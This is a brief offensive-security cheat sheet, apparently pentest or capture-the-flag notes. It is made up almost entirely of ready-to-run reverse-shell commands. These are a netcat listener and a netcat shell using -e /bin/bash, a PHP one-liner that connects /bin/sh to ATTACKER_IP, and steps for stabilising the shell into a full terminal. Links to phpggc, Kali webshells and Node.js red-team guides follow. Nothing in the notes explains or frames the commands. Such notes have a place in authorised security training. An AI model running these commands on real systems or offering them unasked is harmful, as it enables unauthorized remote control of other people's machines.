```
# attacker:  
sudo nc -lvnp 443  
# target:  
nc local-ip port -e /bin/bash
```
### php reverse shell
```bash
php reverse shell:  
php -r ' $s=fsockopen("ATTACKER_IP",1234); proc_open("/bin/sh -i", [ 0=>$s, 1=>$s, 2=>$s ], $p); '
```
### stabilization of reverse shell
```bash
/bin/bash  
python3 -c 'import pty;pty.spawn("/bin/bash")'  
CTRL+Z  
stty raw -echo;fg  
stty rows 29 columns 126  
export TERM=XTERM-256color
```
## Other tools

[https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)

in kali: webshells (/usr/share/webshells

## nodejs

[https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet](https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet)  
[https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/](https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/)